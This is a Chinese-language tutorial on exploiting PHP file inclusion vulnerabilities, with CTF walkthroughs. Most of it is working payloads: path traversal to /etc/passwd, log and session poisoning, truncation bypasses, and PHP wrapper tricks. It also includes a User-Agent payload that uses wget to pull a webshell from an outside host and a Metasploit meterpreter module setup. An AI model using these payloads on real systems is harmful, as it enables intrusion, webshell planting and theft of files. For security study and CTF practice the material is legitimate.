PHP 文件包含漏洞姿势总结

原理

文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。

php 中引发文件包含漏洞的通常是以下四个函数：

1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。

2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。

3、require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行

4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。

当使用这四个函数包含一个新文件时，该文件将作为 PHP 代码执行，php 内核并不在意该被包含的文件是什么类型。所以如果被包含的是 txt 文件、图片文件、远程 url、也都将作为 PHP 代码执行。这一特性，在实施攻击时非常有用。



利用条件

(1) include 等函数通过动态执行变量的方式引入需要包含的文件；

(2)用户能控制该动态变量。



分类

文件包含漏洞可以分为 RFI (远程文件包含)和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。

1、本地文件包含 LFI(Local File Include)

2、远程文件包含 RFI(Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）

在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。



一、本地包含
包含同目录下的文件

?file=test.txt

目录遍历：

?file=./../../test.txt

./ 当前目录 ../ 上一级目录,这样的遍历目录来读取文件

包含图片木马

命令行下执行：

copy x.jpg /b + s.php /b f.jpg

上传 f.jpg、找到 f.jpg 路径、包含 f.jpg

包含日志

利用条件：需要知道服务器日志的存储路径，且日志文件可读。

很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。

?file=../../../../../../../../../var/log/apache/error.log

1、提交如下请求，将 payload 插入日志


![](1.png)
![avatar](/user/desktop/doge.png) 

2、可以尝试利用 UA 插入 payload 到日志文件



3、MSF 攻击模块

 
use exploit/unix/webapp/php_include
set rhost 192.168.159.128
set rport 80
set phpuri /index.php?file=xxLFIxx
set path http://172.18.176.147/
set payload php/meterpreter/bind_tcp
set srvport 8888
exploit -z


日志默认路径

apache+Linux 日志默认路径

/etc/httpd/logs/access_log

或者

/var/log/httpd/access log

apache+win2003 日志默认路径

D:/xampp/apache/logs/access.log

D:/xampp/apache/logs/error.log

IIS6.0+win2003 默认日志文件

C:/WINDOWS/system32/Logfiles

IIS7.0+win2003 默认日志文件

%SystemDrive%/inetpub/logs/LogFiles

nginx 日志文件在用户安装目录的 logs 目录下

如安装目录为 /usr/local/nginx,则日志目录就是在

/usr/local/nginx/logs

也可通过其配置文件 Nginx.conf，获取到日志的存在路径

/opt/nginx/logs/access.log



web 中间件默认配置

apache+linux 默认配置文件

/etc/httpd/conf/httpd.conf

或者

index.php?page=/etc/init.d/httpd

IIS6.0+win2003 配置文件

C:/Windows/system32/inetsrv/metabase.xml

IIS7.0+WIN 配置文件

C:/Windows/System32/inetsrv/config/application/Host.config



包含 session

利用条件：session 文件路径已知，且其中内容部分可控。

PHP 默认生成的 Session 文件往往存放在 /tmp 目录下

/tmp/sess_SESSIONID

?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7

session 文件一般在 /tmp 目录下，格式为 sess_[your phpsessid value]，有时候也有可能在 /var/lib/php5 之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制 session 的值，也许你能够获得一个 shell



包含 /proc/self/environ 文件

利用条件：

1、php 以 cgi 方式运行，这样 environ 才会保持 UA 头。

2、environ 文件存储位置已知，且 environ 文件可读。

姿势：

proc/self/environ 中会保存 user-agent 头。如果在 user-agent 中插入 php 代码，则 php 代码会被写入到 environ 中。之后再包含它，即可。

?file=../../../../../../../proc/self/environ

选择 User-Agent 写代码如下：

<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>

然后提交请求。



包含临时文件



php 中上传文件，会创建临时文件。在 linux 下使用 /tmp 目录，而在 windows 下使用 c:\winsdows\temp 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。

由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux 下使用的随机函数有缺陷，而 window 下只有 65535 中不同的文件名，所以这个方法是可行的。另一种方法 phpinfo 来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到 webshell。



有防御的本地文件包含
审计中可见这样的包含模版文件：

 
<?php
    $file = $_GET['file'];
    include '/var/www/html/'.$file.'/test/test.php';
?>
这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。



1、%00 截断

能利用 00 截断的场景现在应该很少了

PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 (\x00) 将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。

?file=../../../../../../../../../etc/passwd%00

需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效



2、%00 截断目录遍历：

?file=../../../../../../../../../var/www/%00

需要 magic_quotes_gpc=off，unix 文件系统，比如 FreeBSD，OpenBSD，NetBSD，Solaris



3、路径长度截断：

?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.

php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256

利用操作系统对目录最大长度的限制，可以不需要 0 字节而达到截断的目的。

我们知道目录字符串，在 window 下 256 字节、linux 下 4096 字节时会达到最大值，最大值长度之后的字符将被丢弃。

而利用 "./" 的方式即可构造出超长目录字符串:



4、点号截断：

?file=../../../../../../../../../boot.ini/………[…]…………

php 版本小于 5.2.8 可以成功，只适用 windows，点号需要长于 256



5、编码绕过

服务器端常常会对于 ../ 等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲 Web 安全》。

利用 url 编码：

../ -》 %2e%2e%2f -》 ..%2f -》 %2e%2e/

..\ -》 %2e%2e%5c -》 ..%5c -》 %2e%2e\

二次编码：

../ -》 %252e%252e%252f

..\ -》 %252e%252e%255c


二、远程文件包含
?file=[http|https|ftp]://www.bbb.com/shell.txt

可以有三种，http、https、ftp



有防御的远程文件包含

 
<?php 
    $basePath = $_GET['path'];
    require_once $basePath . "/action/m_share.php";  
?>
攻击者可以构造类似如下的攻击 URL

http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php? =http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23

产生的原理:

/?path=http://localhost/test/solution.php?

最终目标应用程序代码实际上执行了:

require_once "http://localhost/test/solution.php?/action/m_share.php";

注意，这里很巧妙，问号 "?" 后面的代码被解释成 URL 的 querystring，这也是一种"截断"思想，和 %00 一样

攻击者可以在 http://localhost/test/solution.php 上模拟出相应的路径，从而使之吻合



PHP 中的封装协议(伪协议)

http://cn2.php.net/manual/zh/wrappers.php

file:///var/www/html 访问本地文件系统

ftp://<login>:<password>@<ftpserveraddress> 访问 FTP(s) URLs

data:// 数据流

http:// — 访问 HTTP(s) URLs

ftp:// — 访问 FTP(s) URLs

php:// — 访问各个输入/输出流

zlib:// — 压缩流

data:// — Data (RFC 2397)

glob:// — 查找匹配的文件路径模式

phar:// — PHP Archive

ssh2:// — Secure Shell 2

rar:// — RAR

ogg:// — Audio streams

expect:// — 处理交互式的流



利用 php 流 input：

利用条件：

1、allow_url_include = On。

2、对 allow_url_fopen 不做要求。

index.php?file=php://input

POST:

<? phpinfo();?>



 

结果将在 index.php 所在文件下的文件 shell.php 内增加 "<?php phpinfo();?>" 一句话



利用 php 流 filter：

?file=php://filter/convert.base64-encode/resource=index.php

通过指定末尾的文件，可以读取经 base64 加密后的文件源码，之后再 base64 解码一下就行。虽然不能直接获取到 shell 等，但能读取敏感文件危害也是挺大的。

其他姿势：

index.php?file=php://filter/convert.base64-encode/resource=index.php

效果跟前面一样，少了 read 等关键字。在绕过一些 waf 时也许有用。



利用 data URIs：

利用条件：

1、php 版本大于等于 php5.2

2、allow_url_fopen = On

3、allow_url_include = On

利用 data:// 伪协议进行代码执行的思路原理和 php:// 是类似的，都是利用了 PHP 中的流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中

?file=data:text/plain,<?php phpinfo();?>

?file=data:text/plain;base64,base64编码的payload

index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

加号 + 的 url 编码为 %2b，PD9waHAgcGhwaW5mbygpOz8+ 的 base64 解码为：<?php phpinfo();?>

需要 allow_url_include=On



利用 XSS 执行任意代码：

?file=http://127.0.0.1/path/xss.php?xss=phpcode

利用条件：

1、allow_url_fopen = On

2、并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊



glob:// 伪协议

glob:// 查找匹配的文件路径模式



phar://

利用条件：

1、php 版本大于等于 php5.3.0

姿势：

假设有个文件 phpinfo.txt，其内容为 <?php phpinfo(); ?>，打包成 zip 压缩包，如下：



指定绝对路径

index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt

或者使用相对路径（这里 test.zip 就在当前目录下）

index.php?file=phar://test.zip/phpinfo.txt



zip://

利用条件：

1、php 版本大于等于 php5.3.0

 
<?php
$file = $_GET['file'];
if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
    include($file);
}
?>
截取过来的后面 4 格字符,判断是不是 jpg,如果是 jpg 才进行包含

但使用 zip 协议，需要指定绝对路径，同时将 # 编码为 %23，之后填上压缩包内的文件。

然后我们构造 zip://php.zip#php.jpg

index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg

注意事项：

1、若是使用相对路径，则会包含失败。

2、协议原型：zip://archive.zip#dir/file.txt

3、注意 url 编码,因为这个 # 会和 url 协议中的 # 冲突



CTF 中的文件包含套路
php 伪协议读取源码

点击 login，发现链接变为：

http://54.222.188.152:1/index.php?action=login.php

推测文件包含 访问：

http://54.222.188.152:1/index.php?action=php://filter/read=convert.base64-encode/resource=login.php

得到源码

贪婪包含

iscc2018 的一道题目,打开题目





查看源码



知道这里调用 show.php?img=1.jpg 访问,并修改 1 的值



大概可以猜测 文件包含漏洞，尝试

img=php://filter/read=convert.base64-encode/resource=show.php

但是不行

题目的坑点在于还需要包含 jpg，这就是贪婪包含所在，也就是后台某处代码所致，

curl http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php

 
<?php
error_reporting(0);
ini_set('display_errors','Off');
include('config.php');
$img = $_GET['img'];
if(isset($img) && !empty($img))
{
    if(strpos($img,'jpg') !== false)
    {
        if(strpos($img,'resource=') !== false && preg_match('/resource=.*jpg/i',$img) === 0)
        {
            die('File not found.');
        }
        preg_match('/^php:\/\/filter.*resource=([^|]*)/i',trim($img),$matches);
        if(isset($matches[1]))
        {
            $img = $matches[1];
        }
        header('Content-Type: image/jpeg');
        $data = get_contents($img);
        echo $data;
    }
    else
    {
        die('File not found.');
    }
}
else
{
    ?>
    <img src="1.jpg">
    <?php
}
?>
1、开头包含了 config.php

2、img 必须有 jpg 但又不能有 resource=.*jpg

3、正则检查了并把结果填充到 $matches 里去，说明我们可以使用 php://filter 伪协议，并且 resource 的值不含|，那么我们就可以用| 来分隔 php 和 jpg，因为正则匹配到| 就不会继续匹配后面的 jpg 了，使得 \$img=show.php

知道了 config.php 再去访问明白为什么必须包含 jpg

 
<?php
function get_contents($img)
{
        if(strpos($img,'jpg') !== false)
        {
                return file_get_contents($img);
        }
        else
        {
                header('Content-Type: text/html');
                return file_get_contents($img);
        }
}
?>
最终 payload:

http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg



%00 截断

要求：

1、php 版本小于 5.3.4

2、magic_quotes_gpc 为 off 状态

大多数的文件包含漏洞都是需要截断的，因为正常程序里面包含的文件代码一般是 include(BASEPATH.$mod.’.php’) 或者 include($mod.’.php’) 这样的方式，如果我们不能写入 .php 为扩展名的文件，那我们是需要截断来利用的受限与 gpc 和 addslashes 等函数的过滤，另外，php5.3 之后的版本全面修复了 %00 截断的问题

 
<?php
include($_GET['a'].'.php')
?> 
上传我们的 2.txt 文件,请求

http://localhost/test/1.php?a=2.txt%00

即可执行 2.txt 中 phpinfo 的代码

列子二

漏洞文件 index.php

 
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>
flag 文件放在上层目录

这里限制了后缀名，我们需要通过截断才能访问到 flag 文件 利用代码：

index.php?file=../../flag.php%00

%00 会被解析为 0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制



路径长度截断

我们现在已经知道使用 %00 截断有两个条件 php 版本小于 5.3.4 和 magic_quotes_gpc 为 off 状态。 如果这时我们将 magic_quotes_gpc 改为 on 那么就不能截断了，因为开启 magic_quotes_gpc 后 %00 会被加上一个反斜杠转义掉



那么我们这时候有没有办法绕过这个限制呢？有一个条件那就是 php 版本小于 5.3.10 我们的代码依旧不变 漏洞文件 index.php

 
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>
flag 文件放在上层目录 这时我们可以使用字符 ./. 和 ./ 来进行绕过，因为文件路径有长度限制

windows 259 个 bytes

linux 4096 个 bytes

在 windows 下需要.字符最少的利用 POC1：

file=../../flag.php..............................................................................................................................................................................................................................................





在 windows 下需要.字符最少的利用 POC2：

file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././





将 flag.php 改为 flag1.php 在 windows 下需要.字符最少的利用 POC3：

file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././



我们发现在使用 payload3 时将文件名改为了 flag1.php，而 payload2 和 payload3 则是一个.开始，一个 / 开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择 payload2，为奇数的时候我们选择 payload3



Refer：
柠檬师傅:

https://www.cnblogs.com/iamstudy/articles/include_file.html

腹黑师傅:

https://zhuanlan.zhihu.com/p/27739315